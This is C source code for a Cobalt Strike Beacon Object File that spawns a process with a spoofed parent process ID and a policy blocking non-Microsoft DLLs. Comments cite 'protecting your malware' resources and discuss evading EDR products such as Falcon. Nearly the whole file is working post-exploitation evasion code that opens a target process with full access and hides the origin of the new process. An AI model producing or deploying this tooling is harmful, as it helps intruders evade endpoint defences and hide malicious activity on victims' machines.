#include <windows.h>
#include "beacon.h"

// Credit/shoutout to: Adam Chester @_xpn_ + @SEKTOR7net + Raphael Mudge
// Thank you for the amazing work that you've contributed. I would not be able to publish this without your blogs, videos, and awesome content!
// Main References for PPID Spoofing & blockdll
// - https://blog.xpnsec.com/protecting-your-malware/
// - https://blog.cobaltstrike.com/2021/01/13/pushing-back-on-userland-hooks-with-cobalt-strike/
// - https://institute.sektor7.net/ (Courses)
// - https://github.com/ajpc500/BOFs 

// Bug Fix (07/20/21) - Compiling issues with on Kali
// macos compiled fine, but on kali some definitions were not included. Manually defined them here. 
// Successful compilation on:
// - Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux
// - x86_64-w64-mingw32-gcc (GCC) 10-win32 20210110
// Defined in WinBase.h on windows system - has "2" at end to avoid duplicate declaration warnings/errors on macOS
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2   0x0000100000000000
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2 0x00020007
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2    0x00020000
/*                              RCX           RDX               R8                            R9      [RSP+0x0]     [RSP+0x8] [RSP+0x10]
UpdateProcThreadAttribute(si.lpAttributeList,   0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy),    NULL,     NULL);
00007FF6BF71195A  mov         qword ptr[rsp + 30h], 0
	00007FF6BF711963  mov         qword ptr[rsp + 28h], 0
	00007FF6BF71196C  mov         qword ptr[rsp + 20h], 8
	00007FF6BF711975  lea         r9, [policy]
	00007FF6BF71197C  mov         r8d, 20007h
	- R8D = PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 20007h = 0x00020007 = DWORD 4 bytes
*/
typedef struct _STARTUPINFOEXA2 {
    STARTUPINFOA StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXA2, *LPSTARTUPINFOEXA2;

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
DECLSPEC_IMPORT WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$InitializeProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$UpdateProcThreadAttribute (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$DeleteProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();

void SpawnProcess(char * peName, DWORD ppid){
    // Declare variables/struct
    // (07/20/21) - Changed from STARTUPINFOEX -> STARTUPINFOEXA
    STARTUPINFOEXA2 sInfoEx = { sizeof(sInfoEx) };
    //   STARTUPINFOEXA - https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
    //   STARTUPINFOA   - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    //   typedef struct _STARTUPINFOEXA {
    //     STARTUPINFOA                 StartupInfo;
    //     LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
    //   } STARTUPINFOEXA, *LPSTARTUPINFOEXA
    PROCESS_INFORMATION pInfo;
    SIZE_T cbAttributeListSize = 0;

    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;

    // Enable blocking of non-Microsoft signed DLL - This will not block EDR DLL's that are signed by Microsoft
    // "Nope, Falcon loads perfectly fine with 'blockdlls' enabled and hooks ntdll. umppcXXXX.dll (Falcon's injected DLL) is digitally signed by MS so no wonder this doesn't prevents EDR injection pic.twitter.com/lDT4gOuYSV"
    //   — reenz0h (@Sektor7Net) October 25, 2019
    // https://blog.xpnsec.com/protecting-your-malware/
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2;

    // Get a handle to the target process
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)ppid);
    if (hProc != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Opened handle 0x%x to process %d(PID)", hProc, ppid);
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get handle to process: %d(PID)", ppid);
        return;
    }
    // Create an Attribute list. Make sure to have the second argument as 2 since we need to have 2 attributes in our lost
    // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
    // - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
    KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &cbAttributeListSize);
    // Allocate memry for our attribute list. We will supply a pointer to this struct to our STARTUPINFOEXA struct
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, cbAttributeListSize);
    // Initialise our list - This sets up our attribute list to hold the correct information to begin with
    KERNEL32$InitializeProcThreadAttributeList(pAttributeList, 2, 0, &cbAttributeListSize);

    // Here we call UpdateProcThreadAttribute twice to make sure our new process will spoof the PPID and start with CFG set to block non MS signed DLLs from loading
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribut
    // Spoof the parent process ID (PPID) using the handle to the process we got from the PID
    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2, &hProc, sizeof(HANDLE), NULL, NULL);
    // Set our new process to not load non-MS signed DLLs - AKA blockDll functional;ity in cobaltstrike
    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2, &policy, sizeof(policy), NULL, NULL);
    sInfoEx.lpAttributeList = pAttributeList;
	
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    WINBOOL check = KERNEL32$CreateProcessA(NULL, peName, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&sInfoEx, &pInfo);
    if (check){
        BeaconPrintf(CALLBACK_OUTPUT, "Success! Spawned process: %s | PID: %d | PPID: %d", peName,pInfo.dwProcessId,ppid);
    }
    // Cleanup the attribute list and close the handle to the parent process we spoofed
    KERNEL32$DeleteProcThreadAttributeList(pAttributeList);
    KERNEL32$CloseHandle(hProc);	
}
void go(char * args, int len) {
    datap parser;
    char * peName;
    DWORD ppid;
    BeaconDataParse(&parser, args, len);
    peName = BeaconDataExtract(&parser, NULL);
    ppid = BeaconDataInt(&parser);
    SpawnProcess(peName,ppid);
}
